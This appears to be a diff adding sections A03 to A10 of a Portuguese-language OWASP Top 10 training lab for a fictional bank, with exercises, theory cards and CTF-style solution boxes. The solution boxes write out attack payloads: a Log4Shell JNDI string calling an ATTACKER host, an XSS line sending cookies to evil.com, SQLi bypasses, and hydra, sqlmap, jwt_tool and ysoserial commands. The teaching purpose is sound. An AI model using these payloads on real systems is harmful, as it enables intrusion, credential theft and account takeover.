+${tabs('a03',['🧪 Laboratório','📖 Teoria','🚩 Solução'])}
+<div id="a03-lab">
+  <div class="lab-box">
+    <h4>🎯 Identifique componentes vulneráveis no stack do Frango's Bank</h4>
+    <div class="output-box" style="margin-bottom:12px;color:#ffcc00">Stack detectado via reconhecimento:
+Server: Apache/2.2.8 | PHP/5.6.0
+jQuery: 1.6.1 | Spring Boot: 2.5.0
+Log4j: 2.14.0 | OpenSSL: 1.0.1e | Struts: 2.3.x</div>
+    <input class="lab-input" id="a03i" placeholder='Buscar CVE: ex "log4j 2.14" ou "spring 2.5"'/>
+    <button class="lab-btn" onclick="a03go()">Buscar CVEs</button>
+    <button class="lab-btn sec" onclick="a03scan()">Rodar dependency-check</button>
+    <div class="output-box" id="a03o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Log4j 2.14 é o famoso Log4Shell (CVSS 10.0). Tente também "spring 2.5" e "struts 2.3".</div>':''}
+  </div>
+</div>
+<div id="a03-info" class="hidden">
+  <div class="info-card"><h5>Supply Chain Attacks</h5><p>Além de CVEs em libs conhecidas: pacotes maliciosos (event-stream, xz-utils), typosquatting (lodash vs. lodahs), dependency confusion, build pipeline comprometido.</p></div>
+  <div class="info-card"><h5>CVEs críticos recentes</h5><p>Log4Shell (CVE-2021-44228, CVSS 10.0), Spring4Shell (CVE-2022-22965), XZ Utils backdoor (CVE-2024-3094), polyfill.io supply chain.</p></div>
+  <div class="info-card"><h5>Ferramentas</h5><p>OWASP Dependency-Check, Snyk, npm audit, pip-audit, retire.js, Wappalyzer, BuiltWith.</p></div>
+</div>
+<div id="a03-sol" class="hidden">
+  <div class="solution-box">dependency-check --project "FrangosBank" --scan /app
+npm audit --audit-level=high
+pip-audit
+retire --js --path /var/www/html
+
+# Log4Shell payload (em qualquer campo logado):
+\${jndi:ldap://ATTACKER:1389/exploit}
+# User-Agent, X-Forwarded-For, campos de login
+
+# Verificar hashes de pacotes:
+sha256sum biblioteca.jar
+# Comparar com hash oficial do repositório</div>
+  <div class="flag" id="a03-flag" style="display:none">🚩 FLAG{A03_FRANGO_LOG4SHELL_SUPPLYCHAIN}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a03-flag').style.display='block';addScore('a03',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a04:()=>`
+<div class="vuln-title">A04 — Cryptographic Failures</div>
+<div class="vuln-owasp">OWASP 2025 #4 &nbsp;|&nbsp; <span class="tag high">ALTO</span> &nbsp;|&nbsp; CWE-261, 310, 319, 326, 327</div>
+<div class="vuln-desc">Dados sensíveis sem criptografia, Base64 "como crypto", MD5/SHA1 para senhas, TLS desatualizado, tokens previsíveis, chaves hardcoded.</div>
+${tabs('a04',['🧪 Laboratório','📖 Teoria','🚩 Solução'])}
+<div id="a04-lab">
+  <div class="lab-box">
+    <h4>🎯 Decodifique dados "protegidos" e analise o cookie de sessão</h4>
+    <div class="output-box" style="margin-bottom:10px;color:#ffcc00">localStorage["fb_session"] = "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw=="
+cookie: auth_token=eyJ1c2VyIjoiY29ybmVsaW8iLCJyb2xlIjoidXNlciJ9</div>
+    <input class="lab-input" id="a04i" placeholder="Cole o valor Base64 aqui"/>
+    <button class="lab-btn" onclick="a04decode()">Decodificar Base64</button>
+    <button class="lab-btn sec" onclick="a04cookie()">Analisar cookie JWT</button>
+    <div class="output-box" id="a04o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Cole "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==" e clique em Decodificar. Base64 não é criptografia!</div>':''}
+  </div>
+</div>
+<div id="a04-info" class="hidden">
+  <div class="info-card"><h5>Erros comuns</h5><p>Senhas em MD5/SHA1 (rainbow tables), Base64 confundido com criptografia, HTTP para dados sensíveis, IVs estáticos em AES, chaves hardcoded no código-fonte.</p></div>
+  <div class="info-card"><h5>Algoritmos: inseguro vs seguro</h5><p>Senhas: MD5 → argon2id | Criptografia: DES → AES-256-GCM | TLS: 1.0/1.1 → 1.3 | Hash geral: SHA1 → SHA-256</p></div>
+</div>
+<div id="a04-sol" class="hidden">
+  <div class="solution-box">echo "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==" | base64 -d
+# → user:cornelio:senha123
+
+# Quebrar hash MD5 (hashcat):
+hashcat -m 0 hash.txt rockyou.txt
+
+# JWT sem assinatura — ver A08 para exploit completo
+
+# Verificar TLS:
+testssl.sh https://target.com
+openssl s_client -connect target.com:443</div>
+  <div class="flag" id="a04-flag" style="display:none">🚩 FLAG{A04_FRANGO_CRYPTO_BASE64NAOECRYPTO}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a04-flag').style.display='block';addScore('a04',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a05:()=>`
+<div class="vuln-title">A05 — Injection</div>
+<div class="vuln-owasp">OWASP 2025 #5 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span> &nbsp;|&nbsp; CWE-77, 89, 564, 917</div>
+<div class="vuln-desc">Input do usuário interpretado como comando. SQL Injection, XSS, NoSQL Injection, LDAP Injection, Template Injection.</div>
+${tabs('a05',['🧪 SQLi','🧪 XSS','📖 Teoria','🚩 Solução'])}
+<div id="a05-lab">
+  <div class="lab-box">
+    <h4>🎯 SQL Injection — Login bypass</h4>
+    <div style="font-size:12px;color:#aaa;margin-bottom:8px">Query: <code style="color:#ff6">SELECT * FROM users WHERE email='$u' AND senha='$p'</code></div>
+    <input class="lab-input" id="a05u" placeholder="Email (tente: admin'--)" style="margin-bottom:6px"/>
+    <input class="lab-input" id="a05p" placeholder="Senha (qualquer coisa)"/>
+    <button class="lab-btn" onclick="a05sqli()">Login</button>
+    <div class="output-box" id="a05o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Digite <code>admin\'--</code> no campo email. O -- comenta o resto da query.</div>':''}
+  </div>
+</div>
+<div id="a05-xss" class="hidden">
+  <div class="lab-box">
+    <h4>🎯 XSS Refletido — Busca de transações</h4>
+    <div style="font-size:12px;color:#aaa;margin-bottom:8px">O campo reflete o input via innerHTML sem sanitização.</div>
+    <input class="lab-input" id="a05x" placeholder="Buscar (tente: &lt;b&gt;teste&lt;/b&gt; depois &lt;img src=x onerror=alert(1)&gt;)"/>
+    <button class="lab-btn" onclick="a05xss()">Buscar</button>
+    <div style="background:#000;border:1px solid #333;border-radius:5px;padding:14px;margin-top:12px;min-height:60px" id="a05xo"></div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Comece com &lt;b&gt;teste&lt;/b&gt; para confirmar XSS. Para executar JS: &lt;img src=x onerror=alert(document.cookie)&gt;</div>':''}
+  </div>
+</div>
+<div id="a05-info" class="hidden">
+  <div class="info-card"><h5>SQL Injection</h5><p>Concatenação direta de input em queries SQL. Um apóstrofo pode quebrar a query e dar controle total ao atacante.</p></div>
+  <div class="info-card"><h5>XSS</h5><p>Input renderizado como HTML permite execução de JS arbitrário: roubo de cookies, redirecionamento, keylogging, defacement.</p></div>
+  <div class="info-card"><h5>Correção</h5><p>Prepared statements (SQL). textContent em vez de innerHTML (XSS). CSP header. Validação de input. ORM com binding.</p></div>
+</div>
+<div id="a05-sol" class="hidden">
+  <div class="solution-box"># SQLi bypass:
+Email: admin'--
+Email: ' OR '1'='1
+Email: ' OR 1=1--
+
+# SQLi dump (sqlmap):
+sqlmap -u "https://target/login" --data="email=*&senha=x" --dbs
+
+# XSS cookie stealing:
+&lt;img src=x onerror=fetch('https://evil.com?c='+document.cookie)&gt;
+&lt;svg onload=eval(atob('BASE64_PAYLOAD'))&gt;
+
+# SSTI (Template Injection):
+{{7*7}} → se retornar 49, tem SSTI</div>
+  <div class="flag" id="a05-flag" style="display:none">🚩 FLAG{A05_FRANGO_INJECTION_SQLI_XSS}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a05-flag').style.display='block';addScore('a05',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a06:()=>`
+<div class="vuln-title">A06 — Insecure Design</div>
+<div class="vuln-owasp">OWASP 2025 #6 &nbsp;|&nbsp; <span class="tag high">ALTO</span> &nbsp;|&nbsp; CWE-73, 183, 209, 256, 419</div>
+<div class="vuln-desc">Falhas de lógica de negócio e arquitetura: race conditions, valores negativos, ausência de controles por design, fluxos de processo bypassáveis.</div>
+${tabs('a06',['🧪 Race Condition','🧪 Valor Negativo','📖 Teoria','🚩 Solução'])}
+<div id="a06-lab">
+  <div class="lab-box">
+    <h4>🎯 Race Condition — Débito duplicado sem lock atômico</h4>
+    <label style="font-size:12px;color:#aaa">Saldo disponível: 🌽</label>
+    <input class="lab-input" id="a06v" value="500" style="width:80px;display:inline-block;margin:0 8px"/>
+    <label style="font-size:12px;color:#aaa">Threads simultâneas:</label>
+    <input class="lab-input" id="a06n" value="2" style="width:60px;display:inline-block;margin:0 8px"/>
+    <button class="lab-btn" onclick="a06race()">Disparar threads</button>
+    <div class="output-box" id="a06o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Use 2+ threads com valor igual ao saldo. Ambas lêem o mesmo saldo, ambas aprovam, ambas debitam.</div>':''}
+  </div>
+</div>
+<div id="a06-neg" class="hidden">
+  <div class="lab-box">
+    <h4>🎯 Negative Value — Transferência com valor negativo</h4>
+    <input class="lab-input" id="a06neg" placeholder="Valor (tente: -1000)"/>
+    <button class="lab-btn" onclick="a06neg()">Transferir</button>
+    <div class="output-box" id="a06o" style="display:none"></div>
+    <div class="output-box" id="a06o2">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: -1000 transferido = seu saldo aumenta em 1000. O sistema valida apenas "saldo suficiente?" sem checar se o valor é positivo.</div>':''}
+  </div>
+</div>
+<div id="a06-info" class="hidden">
+  <div class="info-card"><h5>Falhas de design</h5><p>Race conditions em saldo, valores negativos aceitos, cupons reutilizáveis infinitamente, pular etapas de pagamento, ausência de limites de operação.</p></div>
+  <div class="info-card"><h5>Modelagem de ameaças</h5><p>STRIDE, PASTA, threat modeling durante o design evitam essas falhas. São problemas de arquitetura, não bugs de código.</p></div>
+</div>
+<div id="a06-sol" class="hidden">
+  <div class="solution-box"># Race condition (Burp Turbo Intruder):
+engine = RequestEngine(endpoint, concurrentConnections=20)
+for i in range(20):
+    engine.queue(target.req, gate='race')
+engine.openGate('race')
+
+# Valor negativo via Burp:
+POST /api/transfer
+{"to":"attacker","amount":-5000}
+
+# TOCTOU (Time of Check to Time of Use):
+# 1. Checar saldo: 1000
+# 2. [janela de race]
+# 3. Usar saldo: 1000 (já foi debitado por outra thread!)</div>
+  <div class="flag" id="a06-flag" style="display:none">🚩 FLAG{A06_FRANGO_DESIGN_RACE_CONDITION}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a06-flag').style.display='block';addScore('a06',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a07:()=>`
+<div class="vuln-title">A07 — Authentication Failures</div>
+<div class="vuln-owasp">OWASP 2025 #7 &nbsp;|&nbsp; <span class="tag high">ALTO</span> &nbsp;|&nbsp; CWE-255, 287, 290, 294, 307, 521, 613</div>
+<div class="vuln-desc">Sem rate limiting, senhas fracas, tokens previsíveis, sessões sem expiração, reset inseguro, MFA ausente ou bypassável.</div>
+${tabs('a07',['🧪 Brute Force','🧪 Token Analysis','📖 Teoria','🚩 Solução'])}
+<div id="a07-lab">
+  <div class="lab-box">
+    <h4>🎯 Brute Force — Sem rate limiting ou lockout</h4>
+    <input class="lab-input" id="a07u" value="admin@frangosbank.com"/>
+    <button class="lab-btn" onclick="a07brute()">Iniciar ataque (wordlist)</button>
+    <div class="output-box" id="a07o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: A senha do admin está nas primeiras 15 senhas mais comuns. Hydra e Medusa automatizam isso.</div>':''}
+  </div>
+</div>
+<div id="a07-session" class="hidden">
+  <div class="lab-box">
+    <h4>🎯 Token previsível — Forjar sessão de outro usuário</h4>
+    <button class="lab-btn" onclick="a07session()">Analisar tokens de sessão</button>
+    <div class="output-box" id="a07o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Se o token é base64(user:timestamp:id), basta incrementar o timestamp ou trocar o user.</div>':''}
+  </div>
+</div>
+<div id="a07-info" class="hidden">
+  <div class="info-card"><h5>Falhas comuns</h5><p>Sem bloqueio após N tentativas, tokens de sessão previsíveis (base64/timestamp), link de reset sem expiração, MFA via SMS bypassável por SIM swap.</p></div>
+  <div class="info-card"><h5>Correção</h5><p>Rate limiting + exponential backoff, lockout após 5 tentativas, MFA TOTP, tokens aleatórios (256 bits), expiração de sessão.</p></div>
+</div>
+<div id="a07-sol" class="hidden">
+  <div class="solution-box">hydra -l admin@frangosbank.com \\
+      -P rockyou.txt target.com \\
+      http-post-form "/login:email=^USER^&senha=^PASS^:inválid"
+
+# Credential stuffing:
+# Usar listas de vazamentos (HaveIBeenPwned)
+
+# Token forjado:
+# Decodificar: base64(cornelio:1745999000:1001)
+# Modificar: base64(admin:1745999000:1005)
+# Reusar token modificado</div>
+  <div class="flag" id="a07-flag" style="display:none">🚩 FLAG{A07_FRANGO_AUTH_BRUTEFORCE_NOLOCK}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a07-flag').style.display='block';addScore('a07',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a08:()=>`
+<div class="vuln-title">A08 — Software or Data Integrity Failures</div>
+<div class="vuln-owasp">OWASP 2025 #8 &nbsp;|&nbsp; <span class="tag high">ALTO</span> &nbsp;|&nbsp; CWE-345, 353, 502, 565, 829</div>
+<div class="vuln-desc">JWT sem verificação de assinatura, deserialização insegura, atualizações sem checagem de integridade, pipelines CI/CD comprometidos.</div>
+${tabs('a08',['🧪 JWT Forge','🧪 Deserialização','📖 Teoria','🚩 Solução'])}
+<div id="a08-lab">
+  <div class="lab-box">
+    <h4>🎯 JWT alg:none — Elevar privilégios para admin</h4>
+    <textarea class="lab-input" id="a08i" rows="2">{"user":"cornelio","role":"admin","exp":9999999999}</textarea>
+    <button class="lab-btn" onclick="a08jwt()">Forjar JWT (alg:none)</button>
+    <div class="output-box" id="a08o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: alg:none = sem assinatura. Mude role para "admin" e o servidor aceita sem verificar!</div>':''}
+  </div>
+</div>
+<div id="a08-deserial" class="hidden">
+  <div class="lab-box">
+    <h4>🎯 Deserialização insegura — RCE via cookie</h4>
+    <button class="lab-btn" onclick="a08deserial()">Simular exploit de deserialização</button>
+    <div class="output-box" id="a08o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: PHP unserialize(), Java ObjectInputStream, Python pickle — todos podem executar código se receberem objetos maliciosos.</div>':''}
+  </div>
+</div>
+<div id="a08-info" class="hidden">
+  <div class="info-card"><h5>JWT vulnerável</h5><p>alg:none aceito, HS256 com secret fraco (quebrável por força bruta), RS256 trocado para HS256 usando chave pública como secret.</p></div>
+  <div class="info-card"><h5>Deserialização</h5><p>Java: ysoserial para gerar gadget chains. PHP: unserialize com __wakeup/__destruct. Python: pickle.loads com código malicioso.</p></div>
+</div>
+<div id="a08-sol" class="hidden">
+  <div class="solution-box"># JWT alg:none (Python):
+h = base64({"alg":"none","typ":"JWT"})
+p = base64({"user":"cornelio","role":"admin"})
+token = f"{h}.{p}."  # sem assinatura
+
+# jwt_tool:
+python3 jwt_tool.py TOKEN -X a   # alg:none
+python3 jwt_tool.py TOKEN -T      # tamper
+python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack
+
+# Java deserialização (ysoserial):
+java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin</div>
+  <div class="flag" id="a08-flag" style="display:none">🚩 FLAG{A08_FRANGO_INTEGRITY_JWT_ALG_NONE}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a08-flag').style.display='block';addScore('a08',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a09:()=>`
+<div class="vuln-title">A09 — Security Logging and Alerting Failures</div>
+<div class="vuln-owasp">OWASP 2025 #9 &nbsp;|&nbsp; <span class="tag med">MÉDIO</span> &nbsp;|&nbsp; CWE-117, 223, 532, 778</div>
+<div class="vuln-desc">Logs com dados sensíveis, ausência de alertas para eventos críticos, logs acessíveis publicamente, log injection, sem correlação de eventos suspeitos.</div>
+${tabs('a09',['🧪 Laboratório','📖 Teoria','🚩 Solução'])}
+<div id="a09-lab">
+  <div class="lab-box">
+    <h4>🎯 Explore falhas de logging e alerting</h4>
+    <button class="lab-btn" onclick="a09go('logs')">GET /logs/app.log</button>
+    <button class="lab-btn sec" onclick="a09go('noalert')">Simular: 1000 logins sem alerta</button>
+    <button class="lab-btn sec" onclick="a09go('inject')">Log Injection</button>
+    <div class="output-box" id="a09o">// Selecione uma ação...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Um bom SIEM correlaciona eventos. Aqui, 100 logins falhos não geram nenhum alerta — ataque indetectável!</div>':''}
+  </div>
+</div>
+<div id="a09-info" class="hidden">
+  <div class="info-card"><h5>O que deve ser logado</h5><p>Logins (sucesso/falha+IP), mudanças de senha, transferências, acessos a dados sensíveis, erros de autorização. NUNCA logar senhas, tokens ou dados PII completos.</p></div>
+  <div class="info-card"><h5>Log Injection (CWE-117)</h5><p>Input com newlines pode inserir entradas falsas no log. Ex: username = "admin\n[INFO] Login admin success" cria linha falsa no arquivo de log.</p></div>
+  <div class="info-card"><h5>Ferramentas de monitoramento</h5><p>ELK Stack (Elasticsearch+Logstash+Kibana), Splunk, Graylog, fail2ban para bloqueio automático, Wazuh para SIEM open-source.</p></div>
+</div>
+<div id="a09-sol" class="hidden">
+  <div class="solution-box"># Buscar logs expostos:
+ffuf -u https://target/FUZZ -w logs-wordlist.txt
+# Wordlist: app.log, error.log, debug.log, access.log
+
+# Log injection payload (campo username):
+admin%0a[2026-04-17 09:00:00] LOGIN admin SUCCESS
+
+# Verificar ausência de alertas:
+# Fazer 100 req falhas → monitor não disparou?
+# Indica ausência de SIEM ou regras de correlação
+
+# fail2ban config para proteger:
+[frangosbank-login]
+enabled = true
+maxretry = 5
+findtime = 60
+bantime = 3600</div>
+  <div class="flag" id="a09-flag" style="display:none">🚩 FLAG{A09_FRANGO_LOGGING_SEM_ALERTA_SIEM}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a09-flag').style.display='block';addScore('a09',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a10:()=>`
+<div class="vuln-title">A10 — Mishandling of Exceptional Conditions</div>
+<div class="vuln-owasp">OWASP 2025 #10 &nbsp;|&nbsp; <span class="tag med">MÉDIO</span> &nbsp;|&nbsp; CWE-390, 391, 544, 600, 636, 704</div>
+<div class="vuln-desc">Erros não tratados expõem stack traces, type confusion bypassando validações, exceções que causam falha aberta (fail open), comportamento inesperado com inputs extremos.</div>
+${tabs('a10',['🧪 Stack Trace','🧪 Type Confusion','📖 Teoria','🚩 Solução'])}
+<div id="a10-lab">
+  <div class="lab-box">
+    <h4>🎯 Provoque erros e observe o que é revelado</h4>
+    <button class="lab-btn" onclick="a10go('stacktrace')">Input inválido → Stack trace</button>
+    <button class="lab-btn sec" onclick="a10go('overflow')">Valor extremo → Overflow</button>
+    <div class="output-box" id="a10o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Stack traces revelam: linguagem, versão, estrutura de pacotes, IPs internos, nome das tabelas do banco.</div>':''}
+  </div>
+</div>
+<div id="a10-type" class="hidden">
+  <div class="lab-box">
+    <h4>🎯 Type Confusion — Bypassar validação via coerção de tipos</h4>
+    <button class="lab-btn" onclick="a10go('type')">Testar type confusion</button>
+    <div class="output-box" id="a10o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Em JavaScript, "1000abc" vira 1000 via parseFloat. Tipos inesperados podem bypassar validações.</div>':''}
+  </div>
+</div>
+<div id="a10-info" class="hidden">
+  <div class="info-card"><h5>Fail open vs. fail close</h5><p>Quando ocorre uma exceção em validação de segurança, o sistema deve falhar fechado (negar acesso) e não aberto (permitir acesso). Muitas implementações incorretas fazem o contrário.</p></div>
+  <div class="info-card"><h5>Type confusion</h5><p>Linguagens com coerção de tipos (JS, PHP) são especialmente vulneráveis. "0" == false em PHP, "1e3" == 1000 em JS, null pode bypassar verificações de null.</p></div>
+  <div class="info-card"><h5>Correção</h5><p>Tratar todas as exceções com handlers genéricos em produção, never leak stack traces, usar tipos estritos, validar input antes de qualquer processamento.</p></div>
+</div>
+<div id="a10-sol" class="hidden">
+  <div class="solution-box"># Provocar erros informativos:
+# Campo numérico: "abc", null, "", 99999999999999
+# Campo email: "a@", "@b", "a@@b.com"
+# Datas: "2099-99-99", "0000-00-00"
+
+# Type confusion (PHP loose comparison):
+# "0e1234" == 0 (scientific notation → false bypass)
+# [] != false → mas [] == 0 em alguns contextos
+
+# Fail open exploit:
+# Se auth lança exceção → acesso permitido?
+# Teste: enviar token malformado e observar
+
+# Burp Scanner detecta stack traces automaticamente
+# grep -r "Exception\|stack trace\|at com\." response</div>
+  <div class="flag" id="a10-flag" style="display:none">🚩 FLAG{A10_FRANGO_EXCEPTION_STACKTRACE_LEAK}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a10-flag').style.display='block';addScore('a10',100)">Revelar flag (+100 pts)</button>
+</div>`,
+};
+
+// corrigir o output do a06 neg (usa id diferente)
+const origA06Neg=a06neg;
+window.a06neg=function(){
+  const v=parseFloat(document.getElementById('a06neg').value)||0;
+  const outEl=document.getElementById('a06o2')||document.getElementById('a06o');
+  if(v<0){
+    outEl.textContent=`POST /api/transfer {"amount":${v}}\n\n[SERVER] Validação: saldo >= ${v}? → TRUE\n[SERVER] Debitando ${v}...\n[SERVER] Saldo aumentou em 🌽 ${Math.abs(v).toFixed(2)}!\n\n[⚠️ INSECURE DESIGN] Valor negativo aceito!`;
+    addScore('a06',100);
+  } else {
+    outEl.textContent='Digite um valor negativo, ex: -1000';
+  }
+};
+
+// Inicializar
+document.getElementById('content').innerHTML=VULNS['a01']();
+</script>
